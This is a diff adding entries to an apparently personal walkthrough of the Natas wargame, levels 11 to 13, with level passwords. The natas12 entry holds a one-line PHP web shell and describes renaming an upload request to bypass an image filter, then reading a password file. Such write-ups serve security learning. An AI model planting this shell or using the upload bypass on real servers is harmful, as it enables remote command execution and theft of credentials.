@@ -210,3 +210,35 @@ U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 ### natas11
 
+Ight. This one was rough. I had to get my friend explain this one to me. He knows stuff.
+
+```
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+
+### natas12
+
+Its an image uploader. Ight. So I could read the source code, but I am going to just try a few things.
+
+Below is my standard PHP Cmd
+
+```php
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+```
+
+Lets make a php file and try to upload.
+
+Oh no. It gets renamed to a name with random strings.jpg.
+
+If I look at the request, I can change it before it gets sent.
+
+![image-20200911203346630](../../../Users/Admin/Downloads/natas12.png)
+
+If I rename it to hello.php and go to `/upload/hello.php?e=whoami` I get back the username of the current user. With that I can read `/etc/natas_webpass/natas13`
+
+```
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+```
+
+### natas13
+
